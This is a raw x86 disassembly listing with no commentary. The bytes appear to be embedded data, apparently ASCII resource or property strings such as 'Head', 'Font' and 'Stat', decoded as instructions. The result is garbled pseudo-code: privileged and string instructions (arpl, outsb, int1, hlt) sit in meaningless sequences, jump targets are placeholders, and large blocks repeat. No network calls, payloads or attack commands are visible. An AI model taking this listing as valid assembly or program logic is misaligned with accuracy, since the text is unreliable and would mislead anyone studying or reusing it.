outsd
je r-xdata
outsb
je r-xdata
je r-xdata
jpe r-xdata
arpl [ ebx + 0x53 ] bp
arpl [ ebx + 0x45 ] bp
outsb
pop es
jae r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
jbe r-xdata
outsd
jns r-xdata
add al 0x8
or eax 0x64616548
jb r-xdata
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push cs
push esp
dec eax
popad
jb r-xdata
outsd
outsb
push cs
push esp
dec eax
popad
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
loopne r-xdata
add [ edi + 0x47 ] cl
je r-xdata
add [ ebp + eax * 2 + 0x44 ] bl
add [ eax ] dl
inc esi
je r-xdata
outsb
add al 0x8
or eax 0x64616548
jb r-xdata
je r-xdata
outsd
outsb
je r-xdata
outsb
push esp
jb r-xdata
push esp
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
jbe r-xdata
inc edx
outsd
outsd
insb
popad
outsd
outsb
je r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add [ 0x74646957 ] al
push 0x746e4907
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
lea eax [ eax ]
dec esp
int1
inc esi
add [ eax ] cl
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
adc al [ edx + edx * 2 ]
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + eax + 0x7 ] si
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push edx
jae r-xdata
add [ eax ] al
and [ eax ] 0x0
cmovg ebp [ esi + 0x53 ]
inc esi
add [ eax + 0x2 ] bl
add bh bh
pop eax
add al [ eax ]
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
adc al 0xcd
inc ebx
add [ ecx ] ah
add bh bh
mov eax 0x54004410
adc [ eax + eax ] eax
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
outsd
outsb
je r-xdata
add [ ebx + ebx + 0x44 ] cl
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add al bh
aas
inc edi
add [ eax - 0x33ffbb76 ] dh
pop [ eax + eax + 0x18 ]
pop [ eax + eax - 0x58 ]
adc [ eax + eax + 0x2c ] al
test [ eax + eax + 0x4c ] eax
test [ eax + eax - 0x5c ] eax
add [ eax + eax - 0x10 ] 0xf
inc esp
add ah dh
cmove eax [ eax ]
or al 0x40
inc esp
add [ eax ] bh
inc eax
inc esp
add [ ebx + ebx ] dh
inc esp
add [ ecx + edx + 0x44 ] ch
add al al
sbb al 0x44
add [ eax ] bh
sbb al 0x44
add [ edi + ebx + 0x44 ] cl
add al bh
sbb eax 0x4c1c0044
inc edi
add [ eax + eax * 2 - 0x7d07ffbc ] bh
inc esp
add [ ebx + eax * 4 + 0x44 ] dh
add [ eax + 0x5800447e ] dh
add [ eax + eax - 0x2c ] 0x45
inc esp
add [ esp + ecx * 2 + 0x44 ] dl
add al al
pop ecx
inc esp
add [ eax ] ah
inc ecx
inc edi
add [ esi + edx * 2 + 0x424c0044 ] ah
inc edi
add [ eax + 0x5a ] bl
inc esp
add [ edx + ebx * 2 + 0x44 ] bl
add [ ecx + ebx * 2 ] dl
inc esp
add [ edx + eax * 2 - 0x7b67ffb9 ] dh
inc esp
add [ ebx ] al
inc esp
add [ ecx + eax * 4 + 0x44 ] dl
add [ esp + eax * 4 ] al
inc esp
add al cl
push ecx
inc edi
add [ eax ] al
push edx
inc edi
add [ edi + ecx * 2 ] dh
inc edi
add [ esi ] cl
push esp
dec eax
popad
jb r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
adc dl dh
inc esi
adc dl [ ebx + edx * 2 + 0x65 ]
outsd
outsb
je r-xdata
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax + 0x58004460 ] bl
inc eax
adc al 0xe9
outsd
insb
or [ edi ] al
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push cs
push esp
dec eax
popad
insb
push cs
push esp
dec eax
popad
jb r-xdata
outsb
je r-xdata
dec eax
popad
jb r-xdata
outsd
insb
push cs
push esp
dec eax
popad
jb r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
add eax 0x74617453
adc dl [ gs : ebx + edx * 2 + 0x65 ]
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
js r-xdata
pop edi
add [ eax ] al
push [ eax ]
outsd
insb
nop
hlt
inc esp
add [ eax ] al
dec edi
inc edi
add [ esi + edi ] bh
add [ eax ] al
add al ah
inc esi
add [ eax + 0x2 ] bh
add [ eax ] al
sub bl 0x46
add [ ecx + ebp * 8 ] dl
add cl [ eax ]
or eax 0x64616548
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
outsd
outsb
je r-xdata
je r-xdata
outsd
insb
or [ edi ] al
add [ eax ] al
push cs
add [ ebx ] cl
inc edx
outsd
jb r-xdata
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
jbe r-xdata
inc ebp
outsd
outsb
je r-xdata
outsd
insb
or [ edi ] al
push ebx
add [ esi + esi + 0x40 ] dh
pop es
dec ecx
outsb
je r-xdata
add [ eax ] al
add [ ecx ] dl
add [ eax ] cl
inc esp
jb r-xdata
jb r-xdata
add dh bh
mov [ esi ] bl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000d ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x5465646f
fiadd [ ebx ]
insb
add [ eax ] eax
jmp [ ebp + eax * 4 + 0x10044 ]
jb r-xdata
outsd
insb
push cs
push esp
add al cl
inc eax
inc edi
add [ edi + ecx * 4 + 0x58600044 ] bl
inc esp
add [ edx + ebp * 2 + 0x3e3c0041 ] al
inc eax
jb r-xdata
add [ eax ] al
add [ eax + 0x46040016 ] al
outsd
outsb
je r-xdata
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ edx ] ah
add al [ eax ]
inc [ esi + eax * 2 + 0x47 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + esi * 2 + 0x61 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
jpe r-xdata
adc [ eax ] al
and [ edx ] al
add bh bh
or [ esi + 0x47 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax [ eax ]
or [ esi + 0x75 ] al
insb
insb
inc esp
jb r-xdata
push edx
outsd
jb r-xdata
add bh bh
jpe r-xdata
outsd
outsb
jae r-xdata
add [ bx + si ] dl
inc eax
add [ ecx ] ah
add al [ eax ]
[ esi + eax * 2 ]
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ eax + 0x6f ] cl
je r-xdata
popad
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
str [ edx ]
inc esp
jb r-xdata
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax [ eax ]
push cs
push eax
popad
jb r-xdata
jb r-xdata
inc esi
jb r-xdata
adc [ eax ] al
push eax
add [ eax ] al
add [ eax + 0x440b0012 ] al
jb r-xdata
add [ eax ] al
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090026 ] al
outsb
je r-xdata
add [ edx ] bl
add [ 0x6c797453 ] al
add [ gs : eax ] dl
inc eax
add [ eax ] ah
add bh bh
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080019 ] al
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
imul ebp [ esi + 0x74 ] 0x46e8dc73
adc [ eax ] al
cdq
add [ eax ] al
push [ esi + ebx + 0x1e7c0044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080022 ] al
push 0x6948776f
outsb
je r-xdata
outsb
jae r-xdata
sbb [ eax ] eax
or [ ebx + 0x65 ] dl
arpl [ ecx + ebp * 2 + 0x6f ] si
arpl [ ebx + 0x3c ] bp
jmp r-xdata
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jae r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
jo r-xdata
add [ eax ] al
and eax 0x61500e00
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop ecx
add [ eax ] al
call [ eax + 0x100441e ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al 0x0
or dl [ eax + 0x61 ]
jb r-xdata
dec ebp
outsd
add [ gs : eax ] dl
jmp r-xdata
add [ eax ] cl
add al [ eax ]
[ eax + 0x46 ]
fsub st0
inc esi
inc eax
jb r-xdata
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002c ] al
outsb
or al 0xd0
inc ebx
add al ch
add [ eax ] al
jo r-xdata
outsb
jne r-xdata
add [ eax ] al
sub [ eax ] 0x0
outsb
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax + 0x1 ] al
outsb
je r-xdata
inc eax
add [ ecx ] bl
add bh bh
nop
push ds
inc esp
add [ ecx ] al
add [ eax ] dl
add [ eax ] 0x0
int3
add [ eax ] al
add [ eax + 0x4f09002f ] al
outsb
dec ebp
outsd
jne r-xdata
js r-xdata
push cs
dec edi
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
0x2700046 0xff00
daa
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x78656c62
aam 0x43
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0028 ] al
adc [ eax ] al
push edi
add [ eax ] al
inc [ esp + ebx + 0x3dfc0044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or cl [ edi + 0x6e ]
js r-xdata
push 0x6948776f
outsb
je r-xdata
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
insb
imul esp [ ebx + 0x6b ] r-xdata
clc
dec ecx
dec eax
add [ eax + 0x4a ] bl
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f0020 ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push edx
jae r-xdata
push ebp
jo r-xdata
inc ebp
outsb
inc esp
jb r-xdata
sub eax [ eax ]
or [ edi + 0x6e ] ecx
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002d ] al
add [ eax ] al
dec edi
jbe r-xdata
inc esp
jb r-xdata
dec edi
outsb
push eax
outsd
jo r-xdata
je r-xdata
outsb
outsd
push cs
inc ebp
add [ eax + eax ] bh
[ ebx + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : ecx ] cl
push eax
adc [ eax ] al
0xd8ff0000 0x441e
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax + 0x4f10001f ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
outsb
inc esp
jb r-xdata
jpe r-xdata
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e001d ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
xor al 0x41
add al bh
add [ eax ] al
inc esp
outsd
ja r-xdata
outsb
dec ebp
outsd
jne r-xdata
jb r-xdata
inc esi
or al 0xd2
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0031 ] al
outsb
add [ eax ] al
dec eax
int1
inc esi
add [ edx + ecx * 2 ] cl
dec eax
add [ edx + ecx * 2 + 0x48 ] dh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0021 ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
fmul st6
inc ebx
add al bl
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
adc al 0x4f
outsb
inc ebx
jb r-xdata
rol [ ebx ] 0x1
or [ ecx ] al
add bh bh
or [ ecx ] al
add bh bh
dec esi
insb
jae r-xdata
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add al ah
push edx
jb r-xdata
push ebx
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or ecx [ edi + 0x6e ]
arpl [ ebx + 0x68 ] bp
0x2600046 0xff00
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
popad
je r-xdata
inc eax
stc
inc esi
add ah dh
cmp al [ ecx ]
add [ eax ] al
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
add al dh
inc edi
add [ eax + 0x6b ] ch
inc ecx
add [ esp + ebp * 2 + 0x47 ] ch
add [ eax + 0x6b ] cl
inc edi
add [ edx ] cl
push esp
push esp
jb r-xdata
add al dl
stc
loopne r-xdata
inc esp
outsd
arpl [ ebx + 0x58 ] bp
rol [ ebx ] 0x1
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or ecx [ edi + 0x6e ]
push ebx
je r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x68 ] bp
rol [ ebx ] 0x1
sbb [ ecx ] al
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
or [ edi + 0x6e ] ecx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002b ] al
outsb
outsb
inc ebx
insb
popad
jae r-xdata
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
inc eax
add [ ecx + edi ] bl
dec esi
outsd
jae r-xdata
add [ esp + edi * 8 + 0x46 ] ch
insb
jae r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
stc
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
stc
inc esi
add [ eax ] bl
add [ eax ] al
add [ eax + 0x800413a ] al
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
sar cl 0x1
inc edi
add [ eax + 0x6b ] ch
inc ecx
add [ eax + 0x6b ] dh
inc ecx
add [ eax ] bh
arpl [ edi ] ax
pushad
inc edi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x80040 ] ch
pushad
jb r-xdata
inc edi
add [ ebx + ecx * 4 + 0x455c0047 ] al
inc esp
add [ ebx + ebx + 0x44 ] cl
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add ah bl
outsb
inc edi
add [ eax - 0x33ffbb76 ] dh
pop [ eax + eax + 0x18 ]
pop [ eax + eax - 0x58 ]
adc [ eax + eax + 0x2c ] al
test [ eax + eax + 0x4c ] eax
test [ eax + eax - 0x5c ] eax
add [ eax + eax - 0x8 ] 0x85
inc edi
add ah dh
cmove eax [ eax ]
or al 0x40
inc esp
add [ eax ] bh
inc eax
inc esp
add [ ebx + ebx ] dh
inc esp
add [ eax - 0x3fffb888 ] ch
sbb al 0x44
add [ eax ] bh
sbb al 0x44
add [ edi + ebx + 0x44 ] cl
add al bh
sbb eax 0x86180044
inc edi
add [ eax + eax * 2 - 0x7d07ffbc ] bh
inc esp
add [ ebx + eax * 4 + 0x44 ] dh
add [ eax + 0x5800447e ] dh
add [ eax + eax - 0x2c ] 0x45
inc esp
add [ esp + ecx * 2 + 0x44 ] dl
add al al
pop ecx
inc esp
add [ ecx + esi * 2 + 0x47 ] al
add [ esi + edx * 2 + 0x72680044 ] ah
inc edi
add [ eax + 0x5a ] bl
inc esp
add [ edx + ebx * 2 + 0x44 ] bl
add [ ecx + ebx * 2 ] dl
inc esp
add [ eax - 0x67ffb88c ] bl
test [ eax + eax + 0x4 ] al
arpl [ eax + eax + 0x54 ] ax
add [ eax + eax + 0x4 ] 0xb4004484
mov al [ edi ]
push esi
imul esp [ ebp + 0x77 ] 0x6f727245
jb r-xdata
insd
inc ebx
je r-xdata
add [ eax ] cl
inc ebx
outsd
outsd
jae r-xdata
in al dx
stc
inc esi
add [ edi ] al
or dl [ esp + edx * 2 + 0x72 ]
dec esi
add [ ebp - 0x5a3ffc0 ] cl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edi * 8 + 0x46 ] bl
add [ eax + eax ] cl
add [ eax ] al
push esp
jns r-xdata
or [ esp + edx * 2 + 0x72 ] edx
dec esi
outsd
stc
inc esi
add [ edi ] al
or [ esp + edx * 2 + 0x72 ] edx
dec esi
outsd
xor al 0xf9
inc esi
add ah dh
cmp al [ ecx ]
add [ eax ] al
or [ ebx + 0x6f ] al
inc esp
jb r-xdata
hlt
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh al
sti
inc esi
add [ eax - 0x4 ] bl
inc esi
add [ ebx + eax ] dh
add [ eax ] al
test al 0xdb
inc ebx
add [ ecx + ebp * 8 ] dl
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax + 0x58004460 ] bl
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + esi * 2 - 0x7063ffb9 ] dl
inc esp
add [ eax + 0x58 ] ah
inc esp
add [ edx + ebp * 2 + 0x7a240041 ] al
mov eax 0x46fa
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 8 - 0x393ffba ] dh
inc esi
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0xe004036 ] dh
inc ebp
push esp
jb r-xdata
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x7 ] dl
inc esi
add [ eax ] ch
add [ eax ] al
add [ eax + 0x800413a ] al
cmp [ eax ] eax
adc al 0x39
inc eax
mov eax eax
xor al 0xf9
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edi * 8 + 0x46 ] al
add [ ecx + edi * 8 + 0x46 ] ah
sub_46eea1
pushfd
cmp eax 0x44
add [ eax + 0x1 ] al
adc eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
in al 0xfc
inc ecx
add [ eax ] ch
add bh bh
pop eax
push ds
inc esp
add [ eax + 0x1e ] ch
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
outsd
outsb
je r-xdata
outsd
outsb
jae r-xdata
jmp r-xdata
insb
popad
jae r-xdata
jb r-xdata
fsub st0
inc esi
outsd
or cl ch
inc esi
add [ eax + 0x2 ] al
add bh bh
inc eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d001c ] al
outsb
inc esp
jb r-xdata
adc al 0x4f
outsb
inc ebx
jb r-xdata
add [ eax ] cl
add al [ eax ]
[ eax + 0x46 ]
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080019 ] al
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
jae r-xdata
imul ebp [ esi + 0x74 ] 0x46e8dc73
arpl [ ecx + ebp * 2 + 0x6f ] si
jmp r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0021 ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
push esp
xor al 0x41
add [ eax + 0x2 ] ch
add bh bh
push 0x1ff0002
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f10001f ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
outsb
inc esp
jb r-xdata
ja r-xdata
add al [ eax ]
jmp [ eax + 0x2 ]
popad
je r-xdata
outsb
inc ebx
push eax
jb r-xdata
arpl [ ebx - 0x75 ] bp
ror [ eax + esi * 8 + 0x11080046 ] 0x54
inc esp
jb r-xdata
push ebx
sub cl 0x46
add [ eax + 0x2 ] dl
add bh bh
push eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f0020 ] al
outsb
push ebx
inc esp
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
sub cl 0x46
add [ eax + 0x2 ] cl
add bh bh
dec eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e001d ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
pushad
outsb
pushad
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d001e ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
adc dl [ ebx + edx * 2 + 0x65 ]
arpl [ ecx + ebp * 2 + 0x6f ] si
jae r-xdata
outsb
clc
ja r-xdata
dec esi
outsd
je r-xdata
outsb
je r-xdata
je r-xdata
jpe r-xdata
arpl [ ebx + 0x53 ] bp
arpl [ ebx + 0x45 ] bp
outsb
pop es
jae r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
jbe r-xdata
outsd
jns r-xdata
add al 0x8
or eax 0x64616548
jb r-xdata
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push cs
push esp
dec eax
popad
jb r-xdata
outsd
outsb
push cs
push esp
dec eax
popad
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
loopne r-xdata
add [ edi + 0x47 ] cl
je r-xdata
add [ ebp + eax * 2 + 0x44 ] bl
add [ eax ] dl
inc esi
je r-xdata
outsb
add al 0x8
or eax 0x64616548
jb r-xdata
je r-xdata
outsd
outsb
je r-xdata
outsb
push esp
jb r-xdata
push esp
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
jbe r-xdata
inc edx
outsd
outsd
insb
popad
outsd
outsb
je r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add [ 0x74646957 ] al
push 0x746e4907
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
lea eax [ eax ]
dec esp
int1
inc esi
add [ eax ] cl
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
adc al [ edx + edx * 2 ]
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + eax + 0x7 ] si
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push edx
jae r-xdata
add [ eax ] al
and [ eax ] 0x0
cmovg ebp [ esi + 0x53 ]
inc esi
add [ eax + 0x2 ] bl
add bh bh
pop eax
add al [ eax ]
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
adc al 0xcd
inc ebx
add [ ecx ] ah
add bh bh
mov eax 0x54004410
adc [ eax + eax ] eax
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
outsd
outsb
je r-xdata
add [ ebx + ebx + 0x44 ] cl
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add al bh
aas
inc edi
add [ eax - 0x33ffbb76 ] dh
pop [ eax + eax + 0x18 ]
pop [ eax + eax - 0x58 ]
adc [ eax + eax + 0x2c ] al
test [ eax + eax + 0x4c ] eax
test [ eax + eax - 0x5c ] eax
add [ eax + eax - 0x10 ] 0xf
inc esp
add ah dh
cmove eax [ eax ]
or al 0x40
inc esp
add [ eax ] bh
inc eax
inc esp
add [ ebx + ebx ] dh
inc esp
add [ ecx + edx + 0x44 ] ch
add al al
sbb al 0x44
add [ eax ] bh
sbb al 0x44
add [ edi + ebx + 0x44 ] cl
add al bh
sbb eax 0x4c1c0044
inc edi
add [ eax + eax * 2 - 0x7d07ffbc ] bh
inc esp
add [ ebx + eax * 4 + 0x44 ] dh
add [ eax + 0x5800447e ] dh
add [ eax + eax - 0x2c ] 0x45
inc esp
add [ esp + ecx * 2 + 0x44 ] dl
add al al
pop ecx
inc esp
add [ eax ] ah
inc ecx
inc edi
add [ esi + edx * 2 + 0x424c0044 ] ah
inc edi
add [ eax + 0x5a ] bl
inc esp
add [ edx + ebx * 2 + 0x44 ] bl
add [ ecx + ebx * 2 ] dl
inc esp
add [ edx + eax * 2 - 0x7b67ffb9 ] dh
inc esp
add [ ebx ] al
inc esp
add [ ecx + eax * 4 + 0x44 ] dl
add [ esp + eax * 4 ] al
inc esp
add al cl
push ecx
inc edi
add [ eax ] al
push edx
inc edi
add [ edi + ecx * 2 ] dh
inc edi
add [ esi ] cl
push esp
dec eax
popad
jb r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
adc dl dh
inc esi
adc dl [ ebx + edx * 2 + 0x65 ]
outsd
outsb
je r-xdata
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax + 0x58004460 ] bl
inc eax
adc al 0xe9
outsd
insb
or [ edi ] al
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push cs
push esp
dec eax
popad
insb
push cs
push esp
dec eax
popad
jb r-xdata
outsb
je r-xdata
dec eax
popad
jb r-xdata
outsd
insb
push cs
push esp
dec eax
popad
jb r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
add eax 0x74617453
adc dl [ gs : ebx + edx * 2 + 0x65 ]
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
